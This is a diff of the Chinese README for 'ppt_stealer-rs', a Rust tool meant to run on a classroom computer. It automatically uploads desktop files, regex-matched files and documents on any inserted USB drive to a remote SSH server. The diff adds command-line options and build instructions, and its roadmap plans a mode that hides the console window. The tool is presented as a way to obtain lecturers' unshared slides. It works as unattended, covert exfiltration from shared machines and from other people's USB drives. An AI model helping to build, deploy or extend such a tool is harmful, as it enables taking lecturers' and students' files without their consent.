@@ -1,12 +1,12 @@
 # ppt_stealer-rs
 
-针对国内授课场景，将本地桌面已有的、新增的 PPT, DOC, PDF 自动上传到远程 SSH 服务器。
+针对国内授课场景，将本地桌面或 U 盘内已有的、以及在程序运行后新增的 PPT, DOC, PDF 等文件自动上传到远程 SSH 服务器。
 
 ## 项目介绍
 
 课讲得烂固然糟糕，不公开课件更是雪上加霜。这个程序奈何不了某些渣滓，但可以帮你拿到有用的学习资料。
 
-在课前提前运行这个程序，它可以将已有的、新增的文档自动上传到你指定的远程电脑/服务器。
+在课前提前运行这个程序，它可以将已有的、新增的文档自动上传到你指定的远程电脑/服务器。整个过程，除了程序启动，无需手动操作。你可以手动指定额外的扫描目录，也可以快捷指定所有 U 盘；你也可以指定额外的文件格式；甚至你可以通过正则表达式匹配所有文件名符合你的要求的文件并上传！
 
 ## 项目优势
 
@@ -20,30 +20,46 @@
 
 ## 参数
 
+1. 可以使用主程序指定 `no-gui` 运行
+
 ```plaintext
-Usage: ppt_stealer-rs.exe [OPTIONS]
+Usage: stealer [OPTIONS] [COMMAND]
+
+Commands:
+  gui     Start the slint GUI application
+  no-gui  Start the command-line interface
+  help    Print this message or the help of the given subcommand(s)
+
+Options:
+  -L, --debug-level <DEBUG_LEVEL>
+          Debug level. [default: info] [possible values: trace, debug, info, warn, error]
+  -h, --help
+          Print help
+  -V, --version
+          Print version
+
+
+Usage: stealer no-gui [OPTIONS]
 
 Options:
   -i, --ip <IP>
-          SSH IP address or domain
+          Server IP address or domain
   -p, --port <PORT>
-          SSH IP port
+          Service IP port
   -u, --username <USERNAME>
-          SSH username
+          Service username
   -P, --password <PASSWORD>
-          SSH password
+          Service password
       --key-auth
           Use SSH key authentication. If not assigned, password authentication will be used.
-      --refresh-interval <REFRESH_INTERVAL>
-          Refresh interval in seconds [default: 30]
-      --no-gui
-          Assign no GUI mode
-      --remote-folder-name <REMOTE_FOLDER_NAME>
-          Scan additional folder for files.
+      --upload-targets <UPLOAD_TARGETS>
+          Upload files to a ssh server. Note that you can only choose one kind of remote target! Only SshServer is implemented now. If multiple targets are designated, they should be quoted and separated by single space. [default: local] [possible values: local, ssh-server, smb-server, ftp-server]
+      --target-folder-name <TARGET_FOLDER_NAME>
+          Folder where target files will be stored. If not resigned, it will be stored at $HOME/%Y-%m-%d/{user_name}--{computer_name}
       --usb
           Scan USB for files.
-  -L, --debug-level <DEBUG_LEVEL>
-          Debug level. [default: info] [possible values: trace, debug, info, warn, error]
+      --refresh-interval <REFRESH_INTERVAL>
+          Refresh interval in seconds [default: 30]
       --desktop-path <DESKTOP_PATH>
           Custimised desktop path
   -m, --min-depth <MIN_DEPTH>
@@ -58,9 +74,9 @@ Options:
           Assign file formats [default: "ppt pptx odp doc docx odt xls xlsx ods csv txt md"]
   -h, --help
           Print help
-  -V, --version
-          Print version
 ```
+
+2. 若只需要命令行执行该程序，可以运行 cli 版本。此版本不包含 gtk4 依赖。
 
 ## 关于 SSH 服务器……
 
@@ -77,13 +93,13 @@ Options:
 1. 安装 rustc 和 cargo
    前往 [rust-lang.org/install](https://www.rust-lang.org/tools/install) 下载、安装 Rust 工具链。
 2. cd <项目根目录>
-3. cargo build --release
+3. cargo build --release （如果电脑没有 gtk4，则运行 `cargo build --release -p stealer-cli`）
 4. 二进制文件位于 target/release/ 中
 
 ## 依赖
 
-rustc 1.83.0
-cargo 1.83.0
+Rustc edition 2021 should be able to compile the code, but you should modify the `Cargo.toml` file.  
+Default Rustc edition is 2024.
 
 ```toml
 [dependencies]
@@ -105,11 +121,11 @@ regex = "=1.11.1"
 - [x] 去除缓冲文件 (will be supported in v0.2 final release)
 - [x] 识别 U 盘，并上传其中所有的文档文件 (will be supported in v0.2 final release)
 - [x] 解决上传时 U 盘弹出导致路径不存在、程序 panic 的问题 (will be supported in v0.2 final release)
-- [ ] 添加将文件复制到本地特定目录的功能 (will be supported in v0.3.2)
+- [x] 添加将文件复制到本地特定目录的功能 (will be supported in v0.3.2)
 - [x] 添加额外的本地目录 (will be supported in v0.3)
-- [ ] 添加基于 Slint 客户端
+- [ ] 添加基于 GTK4 客户端
 - [ ] 添加隐藏命令行窗口的模式
-- [ ] 添加对 ftp 服务器的支持
+- [ ] 添加对 FTP、SMB 服务器的支持
 - [x] 在云端保留原文件相对桌面的相对路径 (will be supported in v0.2 final release)
 - [x] 检测到远程同名文件内容相同后，取消重复上传
 - [x] 指定路径，代替默认的桌面路径 (will be supported in v0.3)
